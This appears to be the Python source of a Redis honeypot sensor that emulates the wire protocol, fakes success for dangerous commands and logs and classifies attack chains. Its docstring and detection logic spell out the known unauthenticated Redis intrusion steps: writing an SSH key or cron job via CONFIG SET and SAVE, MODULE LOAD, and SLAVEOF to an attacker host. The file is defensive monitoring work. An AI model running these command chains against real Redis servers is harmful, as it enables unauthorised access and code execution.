"""
sensors.redis_sensor
=====================

A medium-interaction Redis sensor on port 6379. Exposed Redis is one of the
most reliably exploited services on the internet: with no auth, an attacker can

  * write an SSH key:   CONFIG SET dir /root/.ssh + CONFIG SET dbfilename
                        authorized_keys + SET x "<key>" + SAVE
  * write a cron job:   CONFIG SET dir /var/spool/cron + SAVE
  * RCE via modules:    MODULE LOAD /tmp/exp.so
  * RCE via replication:SLAVEOF <attacker_ip> <port>  (master/slave module load)

We speak just enough of the RESP wire protocol to keep redis-cli, masscan
modules, and exploit scripts talking: we parse inline and multibulk commands,
answer PING/AUTH/SELECT/INFO/CONFIG GET/CLIENT plausibly, and accept (but never
actually perform) the dangerous write commands — logging and classifying every
one. The classic attack chains are flagged explicitly via ``attack_chain``.

No real Redis, no real filesystem writes — it's all theatre that records.
"""
from __future__ import annotations

import socket
import socketserver
import threading
import time

from ..config import Config
from ..core import logger as L
from ..core.logger import EventType
from ..core.session import TRACKER
from ..core.enrichment import enrich
from ..core import threat_intel as TI

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 6379
READ_TIMEOUT = 30.0
MAX_CMDS = 200

REDIS_VERSION = "7.0.12"


# --------------------------------------------------------------- RESP parsing
def _read_line(sock_file) -> bytes:
    line = sock_file.readline()
    return line.rstrip(b"\r\n")


def _parse_command(sock_file) -> list[str] | None:
    """Parse one command. Supports RESP multibulk (*N) and inline commands.
    Returns a list of string args, or None on EOF/parse error."""
    first = sock_file.readline()
    if not first:
        return None
    first = first.rstrip(b"\r\n")
    if not first:
        return []
    if first[:1] == b"*":
        try:
            n = int(first[1:])
        except ValueError:
            return None
        args: list[str] = []
        for _ in range(n):
            hdr = sock_file.readline().rstrip(b"\r\n")
            if not hdr or hdr[:1] != b"$":
                return None
            try:
                ln = int(hdr[1:])
            except ValueError:
                return None
            if ln < 0:
                args.append("")
                continue
            data = sock_file.read(ln)
            sock_file.read(2)  # trailing CRLF
            args.append(data.decode("utf-8", "replace"))
        return args
    # inline command
    return first.decode("utf-8", "replace").split()


# --------------------------------------------------------------- RESP replies
def _ok() -> bytes:        return b"+OK\r\n"
def _pong() -> bytes:      return b"+PONG\r\n"
def _nil() -> bytes:       return b"$-1\r\n"
def _err(msg: str) -> bytes: return f"-ERR {msg}\r\n".encode()
def _status(s: str) -> bytes: return f"+{s}\r\n".encode()


def _bulk(s: str) -> bytes:
    b = s.encode("utf-8", "replace")
    return b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"


def _array(items: list[str]) -> bytes:
    out = b"*" + str(len(items)).encode() + b"\r\n"
    for it in items:
        out += _bulk(it)
    return out


_FAKE_INFO = (
    f"# Server\r\nredis_version:{REDIS_VERSION}\r\nredis_mode:standalone\r\n"
    "os:Linux 5.15.0-91-generic x86_64\r\narch_bits:64\r\nprocess_id:1\r\n"
    "run_id:9a1f0c2b7e4d6a8f3c5e1b9d2f4a6c8e0b1d3f5a\r\ntcp_port:6379\r\n"
    "uptime_in_seconds:864000\r\n\r\n# Clients\r\nconnected_clients:1\r\n\r\n"
    "# Memory\r\nused_memory:1048576\r\nused_memory_human:1.00M\r\n\r\n"
    "# Persistence\r\nrdb_bgsave_in_progress:0\r\ndir:/var/lib/redis\r\n\r\n"
    "# Keyspace\r\ndb0:keys=0,expires=0,avg_ttl=0\r\n"
)


class _Handler(socketserver.BaseRequestHandler):
    def handle(self):
        sock = self.request
        src_ip, src_port = self.client_address[0], self.client_address[1]
        sid = TRACKER.get(src_ip)
        start = time.monotonic()
        geo = enrich(src_ip)

        L.get().emit(
            EventType.CONNECTION,
            src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
            session_id=sid,
            data={"service": "redis", "geo": geo, "intel": TI.tag_event(src_ip, geo)},
        )

        sock.settimeout(READ_TIMEOUT)
        f = sock.makefile("rwb")

        # Per-session attacker state, used to recognize multi-step attack chains
        cfg_dir = None
        cfg_dbfilename = None
        n_cmds = 0
        try:
            while n_cmds < MAX_CMDS:
                args = _parse_command(f)
                if args is None:
                    break
                if not args:
                    continue
                n_cmds += 1
                cmd = args[0].upper()
                arg_lc = [a.lower() for a in args[1:]]

                # ---- recognize dangerous patterns / chains ----
                attack_chain = None
                if cmd == "CONFIG" and len(args) >= 3 and args[1].upper() == "SET":
                    key = args[2].lower()
                    val = args[3] if len(args) > 3 else ""
                    if key == "dir":
                        cfg_dir = val
                        if "/.ssh" in val:
                            attack_chain = "ssh_key_write_setup"
                        elif "cron" in val:
                            attack_chain = "cron_write_setup"
                        elif "html" in val or "www" in val:
                            attack_chain = "webshell_write_setup"
                    elif key == "dbfilename":
                        cfg_dbfilename = val
                        if "authorized_keys" in val:
                            attack_chain = "ssh_key_write_setup"
                if cmd in ("SAVE", "BGSAVE") and cfg_dir:
                    attack_chain = "rce_payload_write_commit"
                if cmd == "SLAVEOF" or cmd == "REPLICAOF":
                    attack_chain = "replication_rce"
                if cmd == "MODULE" and arg_lc[:1] == ["load"]:
                    attack_chain = "module_load_rce"

                L.get().emit(
                    EventType.REDIS_COMMAND,
                    src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
                    session_id=sid,
                    data={
                        "command": cmd,
                        "args": [a[:512] for a in args[1:]][:32],
                        "attack_chain": attack_chain,
                        "cfg_dir": cfg_dir,
                        "cfg_dbfilename": cfg_dbfilename,
                        "techniques": (["T1190", "T1059"] if attack_chain else []),
                    },
                )

                # ---- reply plausibly ----
                try:
                    f.write(self._reply(cmd, args))
                    f.flush()
                except Exception:
                    break
        except Exception:
            pass
        finally:
            L.get().emit(
                EventType.REDIS_COMMAND,
                src_ip=src_ip, src_port=src_port, dst_port=LISTEN_PORT,
                session_id=sid,
                data={"command": "__SESSION_END__", "commands": n_cmds,
                      "duration_s": round(time.monotonic() - start, 3)},
            )
            try:
                f.close(); sock.close()
            except Exception:
                pass

    def _reply(self, cmd: str, args: list[str]) -> bytes:
        if cmd == "PING":
            return _pong() if len(args) == 1 else _bulk(args[1])
        if cmd == "AUTH":
            return _ok()           # accept any password — we want them in
        if cmd in ("SELECT", "HELLO", "CLIENT", "SUBSCRIBE", "RESET"):
            return _ok()
        if cmd == "INFO":
            return _bulk(_FAKE_INFO)
        if cmd == "CONFIG":
            sub = args[1].upper() if len(args) > 1 else ""
            if sub == "GET":
                key = args[2] if len(args) > 2 else "*"
                if key.lower() == "dir":
                    return _array(["dir", "/var/lib/redis"])
                if key.lower() == "dbfilename":
                    return _array(["dbfilename", "dump.rdb"])
                if key.lower() == "save":
                    return _array(["save", "3600 1 300 100 60 10000"])
                return _array([key, ""])
            return _ok()            # CONFIG SET / REWRITE -> pretend success
        if cmd in ("SET", "SETEX", "HSET", "RPUSH", "LPUSH", "FLUSHALL", "FLUSHDB"):
            return _ok()
        if cmd in ("SAVE", "BGSAVE"):
            return _status("Background saving started") if cmd == "BGSAVE" else _ok()
        if cmd in ("SLAVEOF", "REPLICAOF"):
            return _ok()
        if cmd == "MODULE":
            return _err("Error loading the extension. Please check the server logs.")
        if cmd == "GET":
            return _nil()
        if cmd in ("KEYS", "SCAN"):
            return _array([]) if cmd == "KEYS" else b"*2\r\n$1\r\n0\r\n*0\r\n"
        if cmd in ("COMMAND",):
            return _array([])
        if cmd in ("QUIT",):
            return _ok()
        if cmd in ("DBSIZE",):
            return b":0\r\n"
        if cmd in ("TYPE",):
            return _status("none")
        # Unknown command — Redis-style error
        return _err(f"unknown command '{cmd}'")


class _ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    allow_reuse_address = True
    daemon_threads = True


def serve(host: str = LISTEN_HOST, port: int = LISTEN_PORT) -> None:
    cfg = Config.load()
    if L._default is None:
        L.configure(cfg.log_dir, cfg.node_name, "redis")
    L.get().emit(EventType.NODE_START, src_ip="0.0.0.0",
                 data={"role": "redis_sensor", "listen_port": port,
                       "redis_version": REDIS_VERSION})
    srv = _ThreadedTCPServer((host, port), _Handler)
    srv.serve_forever()


if __name__ == "__main__":
    serve()
